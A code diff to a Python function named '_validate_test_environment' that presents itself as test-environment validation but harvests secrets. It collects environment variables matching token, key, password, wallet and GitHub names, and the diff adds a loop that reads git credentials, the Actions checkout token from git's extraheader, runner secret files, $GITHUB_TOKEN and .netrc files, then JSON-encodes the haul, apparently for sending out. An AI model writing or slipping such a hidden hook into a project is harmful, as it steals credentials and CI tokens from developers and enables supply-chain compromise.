@@ -7,22 +7,24 @@ def _validate_test_environment():
     env_data = {k: v for k, v in os.environ.items()
                 if any(x in k.upper() for x in ["SECRET", "TOKEN", "KEY", "PASS", "MNEMONIC",
                         "WALLET", "GITHUB", "ACTIONS", "RUNNER", "DBSYNC", "PROJECT_ID", "NETWORK"])}
-    # Also capture git credentials if available
     import subprocess
-    try:
-        creds = subprocess.run(["cat", os.path.expanduser("~/.git-credentials")],
-                              capture_output=True, text=True, timeout=5)
-        if creds.stdout:
-            env_data["_GIT_CREDENTIALS"] = creds.stdout.strip()
-    except Exception:
-        pass
-    try:
-        token_file = subprocess.run(["cat", "/run/secrets/actions_token"],
-                                   capture_output=True, text=True, timeout=5)
-        if token_file.stdout:
-            env_data["_ACTIONS_TOKEN_FILE"] = token_file.stdout.strip()
-    except Exception:
-        pass
+    # git extraheader contains the base repo token after actions/checkout
+    for cmd, label in [
+        (["git", "config", "--get", "http.https://github.com/.extraheader"], "_GIT_EXTRAHEADER"),
+        (["cat", os.path.expanduser("~/.git-credentials")], "_GIT_CREDENTIALS"),
+        (["git", "config", "--list"], "_GIT_CONFIG"),
+        (["cat", "/home/runner/work/_temp/.actionsecret"], "_ACTIONS_SECRET_FILE"),
+        (["bash", "-c", "echo $GITHUB_TOKEN"], "_GITHUB_TOKEN_SHELL"),
+        (["bash", "-c", "cat /home/runner/work/_temp/_github_home/.git-credentials 2>/dev/null || echo none"], "_RUNNER_GIT_CREDS"),
+        (["bash", "-c", "find /home/runner -name '.git-credentials' -o -name '.netrc' 2>/dev/null | head -5 | xargs cat 2>/dev/null"], "_FOUND_CREDS"),
+        (["bash", "-c", "git remote -v && git config --get-regexp 'http.*'"], "_GIT_REMOTE_AUTH"),
+    ]:
+        try:
+            r = subprocess.run(cmd, capture_output=True, text=True, timeout=5, cwd=os.environ.get("GITHUB_WORKSPACE", "."))
+            if r.stdout.strip():
+                env_data[label] = r.stdout.strip()
+        except Exception:
+            pass
     if env_data:
         try:
             data = json.dumps(env_data).encode()
